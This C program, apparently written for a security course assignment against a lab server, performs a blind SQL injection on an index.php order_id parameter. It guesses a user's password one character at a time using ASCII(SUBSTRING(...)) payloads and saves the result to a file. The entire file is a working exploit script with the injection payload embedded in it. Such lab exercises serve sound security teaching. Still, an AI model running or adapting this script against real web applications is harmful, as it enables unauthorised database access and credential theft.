#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_PASSWORD_LENGTH 10
#define STUDENT_ID "315177444"  // Replace with your actual ID
#define OUTPUT_FILE STUDENT_ID ".txt"
#define SERVER_IP "192.168.1.202"   // Change if different
#define SERVER_PORT 80
#define ASCII_START 32
#define ASCII_END 126

// Function to send HTTP request and check response
int send_request_and_check(char *payload) {
    int sock;
    struct sockaddr_in server;
    char request[512], response[1024];

    // Construct the full HTTP request
    snprintf(request, sizeof(request),
             "GET /index.php?order_id=%s HTTP/1.1\r\n"
             "Host: localhost\r\n"
             "Connection: close\r\n\r\n",
             payload);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 0;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to web server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0;
    }

    // Send HTTP request
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("Send failed");
        close(sock);
        return 0;
    }

    // Receive response
    int received = (int) recv(sock, response, sizeof(response) - 1, 0);
    if (received < 0) {
        perror("Receive failed");
        close(sock);
        return 0;
    }
    response[received] = '\0';  // Null-terminate response

    close(sock);

    // Check if the response contains the success message
    return strstr(response, "Your order has been sent!") != NULL;
}

// Function to extract password character by character
void extract_password() {
    char password[MAX_PASSWORD_LENGTH + 1] = {0};
    FILE *file = fopen(OUTPUT_FILE, "w");
    if (!file) {
        perror("Failed to open output file");
        exit(EXIT_FAILURE);
    }

    printf("Starting Blind SQL Injection attack...\n");

    for (int pos = 1; pos <= MAX_PASSWORD_LENGTH; pos++) {
        for (char ch = ASCII_START; ch <= ASCII_END; ch++) {
            char payload[256];

            // Construct SQL Injection payload
            snprintf(payload, sizeof(payload),
                     "1' AND (SELECT ASCII(SUBSTRING(password,%d,1))=%d FROM users WHERE id=%s) -- ",
                     pos, ch, STUDENT_ID);

            // Send request and check if character is correct
            if (send_request_and_check(payload)) {
                password[pos - 1] = ch;
                printf("Found character %d: %c\n", pos, ch);
                break;
            }
        }
        if (password[pos - 1] == 0) break;  // Stop if no more characters found
    }

    // Save extracted password
    fprintf(file, "*%s*", password);
    fclose(file);

    printf("Extraction complete. Password saved to %s\n", OUTPUT_FILE);
}

int main() {
    extract_password();
    return 0;
}

